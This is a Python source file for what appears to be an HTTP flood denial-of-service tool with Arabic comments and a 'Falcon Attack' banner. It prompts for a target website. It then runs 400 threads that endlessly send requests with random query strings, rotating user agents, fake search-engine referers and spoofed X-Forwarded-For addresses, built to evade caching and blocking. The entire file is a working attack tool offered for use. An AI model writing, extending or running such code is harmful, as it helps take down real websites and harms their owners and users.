import urllib.request
import concurrent.futures
import random
import re
import sys
import os
from colorama import Fore
import threading
from halo import Halo
from logo import logo
from ipFake import random_ipFake
from userAgent import uagent
import faker
from fake_useragent import UserAgent

# -------------------------
# تعريف المتغيرات العالمية
global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
fake = faker.Faker()
ua = UserAgent()
flag = 0
safe = 0

# معلومات الأداة
__version__ = '8.0 BETA'
__author__ = "Al-Mohammady Team."
__method__ = 'HTTP V 2 BETA'

# -------------------------
# تعريف الدوال

# زيادة عداد الطلبات
def inc_counter():
    global request_counter
    request_counter += 1

# تعيين العلم
def set_flag(val):
    global flag
    flag = val

# تعيين الوضع الآمن
def set_safe():
    global safe
    safe = 1

# قراءة قائمة الـ referer
def referer_list():
    global headers_referers
    with open('Tools/ref.txt', 'r') as file:
        data = file.readlines()
        headers_referers = [item.strip() for item in data if item.strip()]  # إزالة أي فراغات إضافية
    return headers_referers

# بناء نص عشوائي
def buildblock(size):
    return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(size))

# عرض معلومات الاستخدام
def usage():
    spinner = Halo()
    spinner.succeed(f'Method : {__method__}.')
    spinner.stop()
    print('-' * 40)

# إرسال الطلبات
def httpcall(url):
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    payload = buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
    request_url = url + param_joiner + payload
    headers = {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]) + "/?q=" + buildblock(random.randint(3, 15)),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        # "Keep-Alive": random.randint(110,120),
        # "Cookie": buildcookies(),
        # "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "X-Forwarded-For": fake.ipv4(),
    }

    while True:
        try:
            # إرسال الطلب
            req = urllib.request.Request(request_url, headers=headers)
            urllib.request.urlopen(req)
        except urllib.error.HTTPError as e:
            set_flag(1)
            print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} Response Code !")
            code = e.code
        except urllib.error.URLError as e:
            return True
        except Exception as e:
            # يتم تجاهل الأخطاء غير المتوقعة
            return True
        else:
            inc_counter()

    return code

# دالة استدعاء الطلبات
def http_caller(url):
    while flag < 2:
        code = httpcall(url)
        if code == 500 and safe == 1:
            pass

# مراقبة إرسال الطلبات
def monitor_thread():
    sent = 0
    previous = request_counter
    while flag == 0:
        if previous + 100 < request_counter and previous != request_counter:
            sent += 1
            print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Payload Size : {Fore.YELLOW}{request_counter}.")
            previous = request_counter
    if flag == 2:
        print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")

# -------------------------
# البرنامج الرئيسي
if __name__ == "__main__":
    os.system('clear')
    logo()
    usage()

    # إدخال الهدف
    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")

    if url.count("/") == 2:
        url = url + "/"

    m = re.search('(https?\://)?([^/]*)/?.*', url)
    host = m.group(2)

    # اختيار الوضع الآمن
    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Mode < safe > (yes / no) : ").lower()
    if safe_option == "yes":
        set_safe()

    # إرسال الطلبات بشكل مستمر
    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=400) as executor:
            future_to_url = {executor.submit(http_caller, url): url for _ in range(400)}

            # بدء خيط المراقبة
            t = threading.Thread(target=monitor_thread)
            t.start()

            # انتظار انتهاء جميع المهام
            for future in concurrent.futures.as_completed(future_to_url):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error in thread execution: {e}")

            # انتظار انتهاء خيط المراقبة
            t.join()